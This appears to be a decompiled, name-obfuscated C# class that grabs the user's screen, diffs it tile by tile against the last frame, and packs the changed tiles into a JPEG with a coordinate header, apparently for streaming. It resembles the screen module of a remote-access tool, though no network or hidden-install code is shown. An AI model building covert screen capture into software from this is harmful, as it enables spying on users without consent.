using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns2;

internal class Class1
{
	private static List<Bitmap> list_0 = new List<Bitmap>();

	private static List<Point> list_1 = new List<Point>();

	private static Bitmap bitmap_0 = new Bitmap(1, 1);

	private static int int_0 = 0;

	private static int int_1 = 0;

	private static int int_2 = 0;

	private static Size smethod_0(int int_3)
	{
		Size result = new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		checked
		{
			switch (int_3)
			{
			case 0:
				return result;
			case 1:
				result.Width = (int)Math.Round((double)result.Width / 1.1);
				result.Height = (int)Math.Round((double)result.Height / 1.1);
				break;
			case 2:
				result.Width = (int)Math.Round((double)result.Width / 1.3);
				result.Height = (int)Math.Round((double)result.Height / 1.3);
				break;
			case 3:
				result.Width = (int)Math.Round((double)result.Width / 1.5);
				result.Height = (int)Math.Round((double)result.Height / 1.5);
				break;
			case 4:
				result.Width = (int)Math.Round((double)result.Width / 1.9);
				result.Height = (int)Math.Round((double)result.Height / 1.9);
				break;
			case 5:
				result.Width = (int)Math.Round((double)result.Width / 2.0);
				result.Height = (int)Math.Round((double)result.Height / 2.0);
				break;
			case 6:
				result.Width = (int)Math.Round((double)result.Width / 2.1);
				result.Height = (int)Math.Round((double)result.Height / 2.1);
				break;
			case 7:
				result.Width = (int)Math.Round((double)result.Width / 2.2);
				result.Height = (int)Math.Round((double)result.Height / 2.2);
				break;
			case 8:
				result.Width = (int)Math.Round((double)result.Width / 2.5);
				result.Height = (int)Math.Round((double)result.Height / 2.5);
				break;
			case 9:
				result.Width = (int)Math.Round((double)result.Width / 3.0);
				result.Height = (int)Math.Round((double)result.Height / 3.0);
				break;
			case 10:
				result.Width = (int)Math.Round((double)result.Width / 3.5);
				result.Height = (int)Math.Round((double)result.Height / 3.5);
				break;
			case 11:
				result.Width = (int)Math.Round((double)result.Width / 4.0);
				result.Height = (int)Math.Round((double)result.Height / 4.0);
				break;
			case 12:
				result.Width = (int)Math.Round((double)result.Width / 5.0);
				result.Height = (int)Math.Round((double)result.Height / 5.0);
				break;
			case 13:
				result.Width = (int)Math.Round((double)result.Width / 6.0);
				result.Height = (int)Math.Round((double)result.Height / 6.0);
				break;
			}
			result.Width = Conversions.ToInteger(Strings.Mid(result.Width.ToString(), 1, result.Width.ToString().Length - 1) + Conversions.ToString(0));
			result.Height = Conversions.ToInteger(Strings.Mid(result.Height.ToString(), 1, result.Height.ToString().Length - 1) + Conversions.ToString(0));
			return result;
		}
	}

	private static Image smethod_1(int int_3 = 0, int int_4 = 0, bool bool_0 = true)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		int width = Screen.get_PrimaryScreen().get_Bounds().Width;
		int height = Screen.get_PrimaryScreen().get_Bounds().Height;
		Bitmap val = new Bitmap(width, height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.set_CompositingQuality((CompositingQuality)1);
		int width2 = Screen.get_PrimaryScreen().get_Bounds().Width;
		Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
		Size size = new Size(width2, rectangle.Height);
		val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
		if (bool_0)
		{
			try
			{
				Cursor @default = Cursors.get_Default();
				Point position = Cursor.get_Position();
				size = new Size(32, 32);
				rectangle = new Rectangle(position, size);
				@default.Draw(val2, rectangle);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		val2.Dispose();
		if (int_3 == 0 && int_4 == 0)
		{
			return (Image)(object)val;
		}
		IntPtr intPtr = default(IntPtr);
		return ((Image)val).GetThumbnailImage(int_3, int_4, (GetThumbnailImageAbort)null, intPtr);
	}

	private static string smethod_2(byte[] byte_0)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte_0 = mD5CryptoServiceProvider.ComputeHash(byte_0);
		return Convert.ToBase64String(byte_0);
	}

	private static ImageCodecInfo smethod_3(string string_0)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				if (Operators.CompareString(imageEncoders[num2].get_MimeType(), string_0, false) == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num2];
	}

	public static void smethod_4()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		int_0 = -1;
		int_1 = -1;
		int_2 = -1;
		bitmap_0 = new Bitmap(1, 1);
	}

	public static byte[] smethod_5(int int_3, int int_4, int int_5)
	{
		//IL_0107: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected O, but got Unknown
		//IL_0281: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03de: Expected O, but got Unknown
		//IL_0555: Unknown result type (might be due to invalid IL or missing references)
		//IL_055c: Expected O, but got Unknown
		//IL_056b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0571: Expected O, but got Unknown
		Size size = new Size((Point)smethod_0(int_3));
		checked
		{
			size.Width = Conversions.ToInteger(Strings.Mid(size.Width.ToString(), 1, size.Width.ToString().Length - 1) + Conversions.ToString(0));
			size.Height = Conversions.ToInteger(Strings.Mid(size.Height.ToString(), 1, size.Height.ToString().Length - 1) + Conversions.ToString(0));
			if ((((Image)bitmap_0).get_Size().Width != size.Width) | (((Image)bitmap_0).get_Height() != size.Height) | (int_1 != int_4) | (int_2 != int_5))
			{
				list_0.Clear();
				list_1.Clear();
				bitmap_0 = new Bitmap(size.Width, size.Height);
			}
			int_0 = int_3;
			int_1 = int_4;
			int_2 = int_5;
			List<Bitmap> list = new List<Bitmap>();
			List<Point> list2 = new List<Point>();
			Bitmap val;
			if (list_0.Count > 0)
			{
				list.AddRange(list_0.ToArray());
				list_0.Clear();
				list2.AddRange(list_1.ToArray());
				list_1.Clear();
				val = bitmap_0;
			}
			else
			{
				val = (Bitmap)smethod_1(size.Width, size.Height);
				int width = size.Width;
				int height = size.Height;
				int num = int_4 - 1;
				for (int i = 0; i <= num; i++)
				{
					int num2 = int_4 - 1;
					for (int j = 0; j <= num2; j++)
					{
						int y = (int)Math.Round((double)height / (double)int_4 * (double)i);
						int x = (int)Math.Round((double)width / (double)int_4 * (double)j);
						int num3 = (int)Math.Round((double)width / (double)int_4);
						int num4 = (int)Math.Round((double)height / (double)int_4);
						if (num3.ToString().Contains("."))
						{
							num3 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num3), ".", -1, (CompareMethod)0)[0]);
						}
						if (num4.ToString().Contains("."))
						{
							num4 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num4), ".", -1, (CompareMethod)0)[0]);
						}
						MemoryStream memoryStream = new MemoryStream();
						Bitmap obj = val;
						Rectangle rectangle = new Rectangle(x, y, num3, num4);
						Bitmap val2 = obj.Clone(rectangle, ((Image)val).get_PixelFormat());
						Bitmap obj2 = bitmap_0;
						rectangle = new Rectangle(x, y, num3, num4);
						Bitmap val3 = obj2.Clone(rectangle, ((Image)val).get_PixelFormat());
						((Image)val2).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						byte[] byte_ = memoryStream.ToArray();
						memoryStream.Dispose();
						memoryStream = new MemoryStream();
						((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						byte[] byte_2 = memoryStream.ToArray();
						memoryStream.Dispose();
						if (Operators.CompareString(smethod_2(byte_), smethod_2(byte_2), false) == 0)
						{
							((Image)val2).Dispose();
						}
						else
						{
							list.Add(val2);
							Point item = new Point(x, y);
							list2.Add(item);
						}
						((Image)val3).Dispose();
					}
				}
			}
			if (list.Count == 0)
			{
				return new byte[1] { 0 };
			}
			int num5 = 0;
			List<int> list3 = new List<int>();
			int num6 = (int)Math.Round((double)(int_4 * int_4) / 5.0);
			for (int k = 0; k <= num6 && k != list.Count; k++)
			{
				list3.Add(k);
				num5 += ((Image)list[k]).get_Height();
			}
			Bitmap val4 = new Bitmap(((Image)list[0]).get_Width(), num5);
			Graphics val5 = Graphics.FromImage((Image)(object)val4);
			int num7 = 0;
			string text = Conversions.ToString(((Image)val).get_Width()) + "." + Conversions.ToString(((Image)val).get_Height()) + ",";
			foreach (int item2 in list3)
			{
				text = text + Conversions.ToString(list2[item2].X) + "." + Conversions.ToString(list2[item2].Y) + "." + Conversions.ToString(((Image)list[item2]).get_Height()) + ",";
				val5.DrawImage((Image)(object)list[item2], 0, num7);
				num7 += ((Image)list[item2]).get_Height();
			}
			text += "||UA||";
			int num8 = list.Count - 1;
			for (int l = 0; l <= num8; l++)
			{
				if (!list3.Contains(l))
				{
					list_0.Add(list[l]);
					list_1.Add(list2[l]);
				}
			}
			val5.Dispose();
			MemoryStream memoryStream2 = new MemoryStream();
			EncoderParameters val6 = new EncoderParameters(1);
			val6.get_Param()[0] = new EncoderParameter(Encoder.Quality, unchecked((long)int_5));
			ImageCodecInfo val7 = smethod_3("image/jpeg");
			((Image)val4).Save((Stream)memoryStream2, val7, val6);
			MemoryStream memoryStream3 = new MemoryStream();
			memoryStream3.Write(Encoding.Default.GetBytes(text), 0, text.Length);
			memoryStream3.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
			bitmap_0 = val;
			((Image)val4).Dispose();
			return memoryStream3.ToArray();
		}
	}
}
